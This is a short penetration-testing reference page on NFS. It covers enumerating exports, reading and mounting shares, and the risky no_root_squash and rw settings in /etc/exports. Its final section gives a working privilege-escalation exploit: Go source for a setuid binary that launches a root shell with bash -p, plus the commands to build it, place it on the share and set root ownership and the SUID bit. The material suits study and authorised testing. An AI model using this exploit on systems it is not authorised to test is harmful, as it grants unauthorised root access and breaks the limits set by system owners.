---
title: NFS
description: NFS Methodologies, Tools
---

**`NFS` (Network File System)** allows a System to Share Directories and Files with others over a Network. It does this by Mounting all, or a portion of a file system on a server. **There are no Mechanisms for Authentication.**

```batch
:: NFS
2049/TCP
```

### How NFS Works?

First, the client will Request to Mount a Directory from a Remote Host on a local Directory. The Mount Service will then act to connect to the relevant Mount Daemon using **RPC**.

The Server checks if the user has Permission to Mount whatever directory has been requested. It will then return a file handle which uniquely identifies each File and Directory that is on the Server.


<br/>

## Show Contents

```batch
:: Show Mountable Folders
showmount -e <IP>
```

```batch
:: Show Files without Mounting
nfs-ls nfs://IP/DIRECTORY

:: Read Files without Mounting
nfs-cat nfs://IP/DIRECTORY/FILE_TO_READ
```

## Mounting

```batch
:: Mounting the NFS Share
mkdir /mnt/MOUNT
mount -t nfs IP:/DIRECTORY /mnt/MOUNT -o nolock	
```

## Configuration Files

```batch
:: Location of the Configuration Files
/etc/exports
/etc/lib/nfs/etab
```

```batch
:: Dangerous Settings
no_root_squash
rw
```

---

## NO_ROOT_SQUASH


:::danger Only Possible If **`no_root_squash`** is Enabled

If **`no_root_squash`** is used, remote **Root** Users are able to change any file on the Shared File System.

:::

<br/>


```batch
:: Build 
:: This is going to Generate a Binary Named [setuid]
go build setuid.go

:: Copy the Binary to the NFS Share and Set the Permissions
cp setuid /NFS/SHARE

:: Permissions
sudo chown root:root setuid

:: SUID
sudo chmod +s setuid
```


```batch
:: Executing the Binary is going to Spawn a Shell with Root Permissions
./setuid
```

<details><summary>SOURCE</summary>
<p>

```go
package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
)

func execute() {

	out := exec.Command("/bin/bash", "-p")

	out.Stdin = os.Stdin
	out.Stdout = os.Stdout
	out.Stderr = os.Stderr
	_ = out.Run()
}

func main() {
	if runtime.GOOS == "windows" {
		fmt.Println("Can't Execute this on a Windows Machine.")
	} else {
		fmt.Println("Detected Linux Machine Executing.")
		execute()
	}
}
```

</p>
</details>